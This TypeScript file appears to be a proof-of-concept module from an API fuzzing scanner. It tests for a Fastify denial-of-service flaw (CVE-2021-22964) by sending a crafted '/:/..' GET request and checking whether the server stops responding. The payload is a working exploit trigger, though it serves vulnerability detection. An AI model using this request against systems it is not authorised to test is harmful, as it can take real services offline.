import ApiFuzzerPocGeneric, { ApiFuzzer } from '../api-fuzzer-poc-generic';
import { BotFuzzer } from 'libs/databases/botFuzzer.database';
import { ParsedPacket } from 'libs/databases/parsedPacket.database';

export default class FastifyDOSCVE202122964
  extends ApiFuzzerPocGeneric
  implements ApiFuzzer
{
  constructor(botFuzzer: BotFuzzer, packet: ParsedPacket) {
    super(botFuzzer, packet, FastifyDOSCVE202122964.name);
  }

  async poc() {
    const opt = await this.getAxiosOptionsFromPacket(this.packet);
    const rememberUrl = opt.url;
    let { url } = opt;
    if (url[url.length - 1] !== '/') url += '/';
    opt.method = 'GET';

    opt.url = url + '/:/..'; // GET to -> <host>//:/..
    const res1 = await this.sendOneRequest(opt);

    opt.url = rememberUrl; // Resend this
    const res2 = await this.sendOneRequest(opt);

    // Detect
    if (res1 === null && res2 === null) {
      this.logger.log('Found bug');
      return 1;
    }
    this.logger.log('Not detected');
    return 0;
  }
}
